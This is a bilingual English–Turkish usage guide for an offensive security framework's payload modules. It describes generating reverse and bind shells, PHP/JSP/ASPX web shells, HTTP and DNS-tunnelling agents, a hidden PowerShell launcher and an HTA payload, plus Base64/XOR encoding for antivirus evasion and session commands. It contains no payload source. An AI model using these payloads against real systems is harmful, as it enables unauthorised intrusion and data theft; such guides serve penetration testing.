# 📦 Payload Modules & Usage Guide / Payload Modülleri ve Kullanım Kılavuzu

[🇬🇧 English](#-english) | [🇹🇷 Türkçe](#-türkçe)

---

<a name="-english"></a>
## 🇬🇧 English

Mah-Framework payload modules are used to execute commands or establish connections on target systems. This document details all available payload types and their usage.

### 🐍 Python Payloads

#### 1. `python/shell_reverse_tcp`
A one-liner Python code that opens a reverse shell connection back to the attacker.
*   **Options:**
    *   `LHOST`: Attacker's IP address.
    *   `LPORT`: Attacker's listening port.
*   **Usage:**
    ```bash
    use payloads/python/shell_reverse_tcp
    set LHOST 192.168.1.10
    set LPORT 4444
    generate
    ```

#### 2. `python/shell_bind_tcp`
Python code that opens a port on the target system and waits for a connection (bind shell).
*   **Options:**
    *   `LPORT`: The port to open on the target.
*   **Usage:**
    ```bash
    use payloads/python/shell_bind_tcp
    set LPORT 4444
    generate
    ```

#### 3. `python/mahpreter/reverse_tcp`
A modular reverse shell offering advanced agent (mahpreter) features.
*   **Features:**
    *   System info gathering (`sysinfo`)
    *   Command execution
    *   Base64 Encoding support (for AV evasion)
*   **Options:**
    *   `LHOST`: Attacker's IP.
    *   `LPORT`: Attacker's Port.
    *   `ENCODE`: `base64` or `None`. (Optional)

---

### 🌐 Web Shell Payloads

#### 1. `php/reverse_tcp` (PHP)
A `.php` reverse shell for web servers supporting PHP.
*   **Usage:**
    ```bash
    use payloads/php/reverse_tcp
    set LHOST <IP>
    set LPORT <PORT>
    generate
    ```

#### 2. `java/jsp_reverse_tcp` (JSP)
A `.jsp` reverse shell for Java application servers like Tomcat or JBoss.

#### 3. `windows/aspx_reverse_tcp` (ASP.NET)
A C# based `.aspx` reverse shell for IIS (Internet Information Services) servers.

---

### 📡 Advanced Connection Methods

#### 1. `mahpreter/reverse_http`
Uses HTTP protocol to communicate, aiming to bypass Firewalls.
*   **Mechanism:** Agent sends HTTP GET/POST requests to receive commands and send output.
*   **Note:** Use the accompanying `server.py` module as the handler.

#### 2. `mahpreter/reverse_dns` (Experimental)
Uses DNS queries (TXT records) for data exfiltration (DNS Tunneling).

---

### 🖥️ Platform Specific Payloads

#### 1. `windows/powershell_reverse_tcp`
Generates a Base64 encoded PowerShell command for Windows systems.
*   **Feature:** Runs hidden using `-windowstyle hidden`.

#### 2. `linux/bash_reverse_tcp`
Generates a Bash script using `/dev/tcp` sockets for Linux systems.

#### 3. `windows/hta_reverse_tcp`
Generates an HTML Application (HTA) file containing embedded VBScript/PowerShell.

---

### 🛡️ Encoder Support

Mah-Framework offers encoding mechanisms to obfuscate payloads:
*   **Base64:** Converts payload to Base64 and decodes at runtime.
*   **XOR:** Simple XOR encryption algorithm.

---
---

### 🖥️ Handling Connections & Sessions

Once a payload executes on the target and connects back to your listener, a new session is created.

*   **List Sessions:**
    ```bash
    sessions -l
    ```
*   **Interact with a Session:**
    ```bash
    sessions -i <session_id>
    ```
*   **Kill a Session:**
    ```bash
    sessions -k <session_id>
    ```

---

<a name="-türkçe"></a>
## 🇹🇷 Türkçe

Mah-Framework bünyesinde bulunan payload modülleri, hedef sistemlerde komut çalıştırma veya bağlantı sağlama amacıyla kullanılır. Bu belge, mevcut tüm payload türlerini ve kullanım detaylarını içerir.

### 🐍 Python Payload'ları

#### 1. `python/shell_reverse_tcp`
Hedef sistemden saldırgana (bize) doğru ters bağlantı (reverse shell) açan tek satırlık (one-liner) Python kodudur.
*   **Seçenekler:**
    *   `LHOST`: Saldırganın IP adresi.
    *   `LPORT`: Saldırganın dinlediği port.
*   **Kullanım:**
    ```bash
    use payloads/python/shell_reverse_tcp
    set LHOST 192.168.1.10
    set LPORT 4444
    generate
    ```

#### 2. `python/shell_bind_tcp`
Hedef sistemde belirli bir portu açıp bekleyen (bind shell) Python kodudur.
*   **Seçenekler:**
    *   `LPORT`: Hedefin açacağı port.
*   **Kullanım:**
    ```bash
    use payloads/python/shell_bind_tcp
    set LPORT 4444
    generate
    ```

#### 3. `python/mahpreter/reverse_tcp`
Gelişmiş ajan (agent) özellikleri sunan, modüler yapıya sahip reverse shell.
*   **Özellikler:**
    *   Sistem bilgisi toplama (`sysinfo`)
    *   Komut çalıştırma
    *   Base64 Encoding desteği (Antivirüs atlatma için)
*   **Seçenekler:**
    *   `LHOST`: Saldırganın IP adresi.
    *   `LPORT`: Saldırganın dinlediği port.
    *   `ENCODE`: `base64` veya `None`. (Opsiyonel)

---

### 🌐 Web Shell Payload'ları

#### 1. `php/reverse_tcp` (PHP)
PHP destekleyen web sunucuları için `.php` uzantılı reverse shell.
*   **Kullanım:**
    ```bash
    use payloads/php/reverse_tcp
    set LHOST <IP>
    set LPORT <PORT>
    generate
    ```

#### 2. `java/jsp_reverse_tcp` (JSP)
Tomcat, JBoss vb. Java uygulama sunucuları için `.jsp` uzantılı reverse shell.

#### 3. `windows/aspx_reverse_tcp` (ASP.NET)
IIS (Internet Information Services) sunucuları için `.aspx` uzantılı C# tabanlı reverse shell.

---

### 📡 Gelişmiş Bağlantı Yöntemleri

#### 1. `mahpreter/reverse_http`
HTTP protokolü üzerinden haberleşerek güvenlik duvarlarını (Firewall) atlatmayı hedefler.
*   **Çalışma Mantığı:** Ajan, sunucuya HTTP GET/POST istekleri atarak komut alır ve çıktı gönderir.
*   **Not:** Yanında gelen `server.py` modülü handler olarak kullanılmalıdır.

#### 2. `mahpreter/reverse_dns` (Deneysel)
DNS sorguları (TXT kayıtları) üzerinden veri sızdırma (Tunneling) yöntemini kullanır.

---

### 🖥️ Platform Spesifik Payload'lar

#### 1. `windows/powershell_reverse_tcp`
Windows sistemler için Base64 ile şifrelenmiş PowerShell komutu üretir.
*   **Özellik:** `-windowstyle hidden` ile gizli çalışır.

#### 2. `linux/bash_reverse_tcp`
Linux sistemler için `/dev/tcp` soketini kullanan Bash scripti üretir.

#### 3. `windows/hta_reverse_tcp`
HTML Application (HTA) formatında, VBScript içinde gömülü PowerShell çalıştıran dosya üretir.

---

### 🛡️ Encoder (Şifreleme) Desteği

Mah-Framework, payloadların tespit edilmesini zorlaştırmak için çeşitli encoding mekanizmaları sunar.
*   **Base64:** Payload kodunu Base64 formatına çevirir ve runtime'da decode eder.
*   **XOR:** Basit XOR şifreleme algoritması.

### 🖥️ Bağlantıları Yönetme ve Oturumlar (Sessions)

Bir payload hedef sistemde çalışıp dinleyicinize bağlandığında, yeni bir oturum oluşturulur.

*   **Oturumları Listele:**
    ```bash
    sessions -l
    ```
*   **Oturumla Etkileşime Geç:**
    ```bash
    sessions -i <session_id>
    ```
*   **Oturumu Sonlandır:**
    ```bash
    sessions -k <session_id>
    ```

*Dokümantasyon son güncelleme tarihi: 2026-02-09*
